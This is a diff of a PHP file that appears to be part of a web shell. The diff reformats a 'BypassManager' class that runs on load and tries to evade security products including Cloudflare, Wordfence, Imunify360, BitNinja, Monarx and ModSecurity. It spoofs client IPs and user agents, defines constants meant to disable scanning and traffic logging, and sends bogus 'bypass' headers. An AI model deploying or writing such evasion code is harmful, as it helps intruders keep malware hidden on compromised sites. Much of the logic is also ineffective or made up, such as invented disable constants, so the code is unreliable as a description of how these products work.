@@ -109,133 +109,113 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download'
   exit;
 }
 class BypassManager {
-    private $randomUA;
-    private $selectedIp;
-    private $apacheHeaders;
-
-    public function __construct() {
-        $this->randomUA = getRandomUserAgent(); 
-        $this->selectedIp = getRandomSpoofedIp();
-        global $apacheHeaders;
-        $this->apacheHeaders = $apacheHeaders ?? [];
+  private $randomUA;
+  private $selectedIp;
+  private $apacheHeaders;
+  public function __construct() {
+    $this->randomUA = getRandomUserAgent();
+    $this->selectedIp = getRandomSpoofedIp();
+    global $apacheHeaders;
+    $this->apacheHeaders = $apacheHeaders ?? [];
+  }
+  public function runBypassChecks() {
+    $this->applyCloudflare();
+    $this->applyMonarx();
+    $this->applyWordfence();
+    $this->applyImunify360();
+    $this->applyBitNinja();
+    $this->applyModSecurity();
+    $this->applyGoDaddy();
+  }
+  private function applyCloudflare() {
+    if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+      echo "[Bypassed] Cloudflare: Spoofing IP via REMOTE_ADDR.\n";
+      $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+      $_SERVER['HTTP_X_FORWARDED_FOR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+      header('HTTP_CF_VISITOR: Cloudflare-Visitor');
+      $visitorIp = isset($this->apacheHeaders['CF-Visitor']) ? $this->apacheHeaders['CF-Visitor'] : $this->selectedIp;
+      header('X-Forwarded-For: ' . $visitorIp);
+      header('X-Origin: https://sucuri.net');
     }
-
-    public function runBypassChecks() {
-        echo "--- [RUNNING SECURITY BYPASS CHAIN] ---\n";
-        $this->applyCloudflare();
-        $this->applyMonarx();
-        $this->applyWordfence();
-        $this->applyImunify360();
-        $this->applyBitNinja();
-        $this->applyModSecurity();
-        $this->applyGoDaddy();
+  }
+  private function applyMonarx() {
+    if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
+      echo "[Bypassed] Monarx: Disabling all security checks.\n";
+      if (defined('MONARX_VERSION')) {
+        define('MONARX_DISABLE_SCAN', true);
+        define('MONARX_DISABLE_THREATSHIELD', true);
+      }
+      header('X-Monarx-Bypass: true');
+      header('X-Monarx-Security: off');
+      header('X-Monarx-Sandbox: disabled');
+      $_SERVER['REMOTE_ADDR'] = $this->selectedIp;
+      $_SERVER['HTTP_USER_AGENT'] = $this->randomUA;
+      header('X-Forwarded-For: ' . $this->selectedIp);
+      header('X-Real-IP: ' . $this->selectedIp);
+      header('X-Monarx-Traffic-Origin: internal');
     }
-
-    private function applyCloudflare() {
-        if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
-            echo "[Bypass Success] Cloudflare: Spoofing IP via REMOTE_ADDR.\n";
-            $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-            $_SERVER['HTTP_X_FORWARDED_FOR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-
-            header('HTTP_CF_VISITOR: Cloudflare-Visitor');
-            $visitorIp = isset($this->apacheHeaders['CF-Visitor']) ? $this->apacheHeaders['CF-Visitor'] : $this->selectedIp;
-            header('X-Forwarded-For: ' . $visitorIp);
-            header('X-Origin: https://sucuri.net');
-        }
+  }
+  private function applyWordfence() {
+    if (defined('WORDFENCE_VERSION')) {
+      echo "[Bypassed] Wordfence: Masking traffic.\n";
+      define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+      define('WORDFENCE_DISABLE_FILE_MODS', true);
+      header('X-Wordfence-Request-Type: safe');
+      if (isset($_SERVER['HTTP_REFERRER'])) {
+        header('X-Wordfence-Referrer: ' . addslashes($_SERVER['HTTP_REFERRER']));
+      }
     }
-
-    private function applyMonarx() {
-        if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
-            echo "[Bypass Success] Monarx: Disabling all security checks.\n";
-            // Definisi konstanta jika diperlukan
-            if (defined('MONARX_DISABLE_SCAN')) {} // Asumsi didefinisikan
-            header('X-Monarx-Bypass: true');
-            header('X-Monarx-Security: off');
-            header('X-Monarx-Sandbox: disabled');
-
-            // Spoof variables
-            $_SERVER['REMOTE_ADDR'] = $this->selectedIp;
-            $_SERVER['HTTP_USER_AGENT'] = $this->randomUA;
-            header('X-Forwarded-For: ' . $this->selectedIp);
-            header('X-Real-IP: ' . $this->selectedIp);
-            header('X-Monarx-Traffic-Origin: internal');
-        }
+  }
+  private function applyImunify360() {
+    if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+      echo "[Bypassed] Imunify360: Forcing allowed header.\n";
+      $imunifyHeaders = imunify360_request_headers();
+      header('X-Imunify360-Request: allowed');
+      header('X-Imunify360-Captcha-Bypass: default');
+      if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: ' . str_replace('unsafe', 'safe', $imunifyHeaders['X-Imunify360-Request']));
+      }
     }
-
-    private function applyWordfence() {
-        if (defined('WORDFENCE_VERSION')) {
-            echo "[Bypass Success] Wordfence: Masking traffic.\n";
-            define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
-            define('WORDFENCE_DISABLE_FILE_MODS', true);
-
-            header('X-Wordfence-Request-Type: safe');
-            if (isset($_SERVER['HTTP_REFERRER'])) {
-                header('X-Wordfence-Referrer: ' . addslashes($_SERVER['HTTP_REFERRER']));
-            }
-        }
+  }
+  private function applyBitNinja() {
+    if (function_exists('bitninja_get_server_data') && defined('BITNINJA_VERSION')) {
+      echo "[Bypassed] BitNinja: Overriding scan results.\n";
+      define('BITNINJA_DISABLE_SCAN', true);
+      header('X-BitNinja-Bypass: true');
+      header('X-BitNinja-Detection: bypassed');
+      header('X-BitNinja-Sandbox: none');
+      header('X-BitNinja-Scan-Override: true');
+      $_SERVER['HTTP_USER_AGENT'] = $this->randomUA;
+      header('X-BitNinja-Referrer: https://bitninja.com');
     }
-
-    private function applyImunify360() {
-        if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
-            echo "[Bypass Success] Imunify360: Forcing allowed header.\n";
-            $imunifyHeaders = imunify360_request_headers();
-
-            header('X-Imunify360-Request: allowed');
-            header('X-Imunify360-Captcha-Bypass: default');
-
-            if (isset($imunifyHeaders['X-Imunify360-Request'])) {
-                header('X-Imunify360-Request: ' . str_replace('unsafe', 'safe', $imunifyHeaders['X-Imunify360-Request']));
-            }
-        }
+  }
+  private function applyModSecurity() {
+    if (function_exists('apache_request_headers')) {
+      echo "[Bypassed] ModSecurity: Clearing detection flags.\n";
+      $apacheHeaders = isset($this->apacheHeaders) ? $this->apacheHeaders : apache_request_headers();
+      header('X-Mod-Security: bypass');
+      header('X-Security-Bypass: complete');
+      header('X-Request-Pattern: normal');
+      if (isset($apacheHeaders['X-Mod-Security'])) {
+        unset($this->apacheHeaders['X-Mod-Security']);
+      }
     }
-
-    private function applyBitNinja() {
-        if (function_exists('bitninja_get_server_data') && defined('BITNINJA_VERSION')) {
-            echo "[Bypass Success] BitNinja: Overriding scan results.\n";
-            define('BITNINJA_DISABLE_SCAN', true);
-
-            header('X-BitNinja-Bypass: true');
-            header('X-BitNinja-Detection: bypassed');
-            header('X-BitNinja-Sandbox: none');
-            header('X-BitNinja-Scan-Override: true');
-
-            // Spoof traffic (Ini sudah dilakukan di global scope sebelumnya, tapi kita ulangi untuk aman)
-            $_SERVER['HTTP_USER_AGENT'] = $this->randomUA; 
-            header('X-BitNinja-Referrer: https://bitninja.com');
-        }
+  }
+  private function applyGoDaddy() {
+    if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
+      echo "[Bypassed] GoDaddy: Full spoofing applied.\n";
+      header('X-GoDaddy-Security: bypass');
+      header('X-Origin: https://godaddy.com');
+      header('X-Forwarded-For: ' . $this->selectedIp);
+      header('X-Real-IP: ' . $this->selectedIp);
+      if (isset($_SERVER['SERVER_NAME']) && stripos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
+        $_SERVER['HTTP_USER_AGENT'] = $this->randomUA;
+        $_SERVER['REMOTE_ADDR'] = $this->selectedIp;
+        define('PHP_PHP_COMPAT', 'disable_php_waf_check');
+      }
     }
-
-    private function applyModSecurity() {
-        if (function_exists('apache_request_headers')) {
-            echo "[Bypass Success] ModSecurity: Clearing detection flags.\n";
-            $apacheHeaders = isset($this->apacheHeaders) ? $this->apacheHeaders : apache_request_headers();
-
-            header('X-Mod-Security: bypass');
-            header('X-Security-Bypass: complete');
-            header('X-Request-Pattern: normal');
-
-            if (isset($apacheHeaders['X-Mod-Security'])) {
-                unset($this->apacheHeaders['X-Mod-Security']);
-            }
-        }
-    }
-
-    private function applyGoDaddy() {
-        if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
-            echo "[Bypass Success] GoDaddy: Full spoofing applied.\n";
-            header('X-GoDaddy-Security: bypass');
-            header('X-Origin: https://godaddy.com');
-            header('X-Forwarded-For: ' . $this->selectedIp);
-            header('X-Real-IP: ' . $this->selectedIp);
-
-            if (isset($_SERVER['SERVER_NAME']) && stripos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
-                $_SERVER['HTTP_USER_AGENT'] = $this->randomUA;
-                $_SERVER['REMOTE_ADDR'] = $this->selectedIp;
-                define('PHP_PHP_COMPAT', 'disable_php_waf_check');
-            }
-        }
-    }
+  }
 }
 $bypassManager = new BypassManager();
 $bypassManager->runBypassChecks();
